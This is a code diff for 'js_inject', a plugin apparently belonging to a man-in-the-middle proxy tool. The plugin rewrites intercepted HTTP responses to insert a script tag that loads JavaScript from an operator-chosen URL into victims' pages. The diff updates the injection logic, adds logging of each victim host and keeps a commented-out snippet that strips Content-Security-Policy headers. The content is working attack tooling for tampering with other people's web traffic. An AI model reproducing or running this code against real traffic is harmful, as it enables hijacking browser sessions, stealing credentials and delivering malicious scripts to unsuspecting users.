@@ -25,9 +25,9 @@ Copyright:
 class js_inject(PluginTemplate):
     meta = {
         'Name'      : 'js_inject',
-        'Version'   : '1.0',
+        'Version'   : '1.1',
         'Description' : 'url injection insert and use our own JavaScript code in a page.',
-        'Author'    : 'Marcos Nesster'
+        'Author'    : 'by Maintainer'
     }
     def __init__(self):
         for key,value in self.meta.items():
@@ -40,16 +40,17 @@ class js_inject(PluginTemplate):
 
     def response(self,flow):
         with decoded(flow.response):  # Remove content encoding (gzip, ...)
-            html = BeautifulSoup(flow.response.content)
+            html = BeautifulSoup(flow.response.content,'lxml')
             """
             # To Allow CORS
             if "Content-Security-Policy" in flow.response.headers:
                 del flow.response.headers["Content-Security-Policy"]
             """
             if html.body:
-                script = html.new_tag(
-                    'script',
-                    src=self.url)
-                html.body.insert(0, script)
+                url =  '{}'.format(flow.request.pretty_host)
+                metatag = html.new_tag('script')
+                metatag.attrs['src'] = self.url
+                metatag.attrs['type'] = 'text/javascript'
+                html.body.append(metatag)
                 flow.response.content = str(html)
-                self.send_output.emit("[{}]******* script Filter Injected *******".format(self.Name))
+                self.send_output.emit("[{} js script Injected in [ {} ]".format(self.Name,url))
